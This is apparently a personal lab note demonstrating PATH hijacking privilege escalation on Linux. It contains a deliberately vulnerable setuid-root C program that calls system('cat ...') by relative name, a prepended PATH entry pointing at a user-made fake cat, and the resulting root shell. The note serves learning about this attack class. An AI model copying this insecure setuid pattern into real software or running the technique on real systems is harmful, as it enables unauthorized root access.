# path hijacking
## What is the path?
```bash
echo $PATH
# ans
/home/edibauer/.nvm/versions/node/v25.2.1/bin:/home/edibauer/.local/bin:/home/edibauer/.local/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/edibauer/.dotnet/tools

# CREATING A READER FILE
#+ begin reader.c
// Compile with:
// gcc reader.c -o reader

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

char *VALID_FILES[] = { "01.txt", "02.txt" };
int valid_files_count = 2;

int main(int argc, char**argv) {
    if (argc < 2) {
        fprintf(stderr, "[INFO] Usage %s <filename>\n", argv[0]);
        return -1;
    }

    char *user_filename = argv[1];

    for (int i = 0; i < valid_files_count; i++) {
        char *valid_filename = VALID_FILES[i];
        int length = strlen(valid_filename);

        if(!strncmp(user_filename, valid_filename, length)) {
            char cmd[42] = {0};
            sprintf(cmd, "cat ./archive/%s", user_filename);
            setuid(0);
            setgid(0);
            system(cmd);
            return 0;
        }
    }

    printf("[INFO] No file with such names were found.\n");
    return 0;

}
#+ end reader.c

gcc reader.c -o reader

# FILE PERMISSSIONS

drwxrwxr-x 2 root     root      4096 Mar 15 22:15 archive
-rwxrwxr-x 1 edibauer edibauer    28 Mar 15 22:22 cat
-rwsr-xr-x 1 root     root     16464 Mar 15 22:08 reader
-rw-rw-r-- 1 edibauer edibauer   863 Mar 15 22:04 reader.c

# CHANGING PATH
PATH=.:$PATH

# RUNNGIN BINARY
./reader 01.txt

┌──(root㉿kali)-[~/Desktop/hexdump/PRIVESC]
└─# whoami
root


```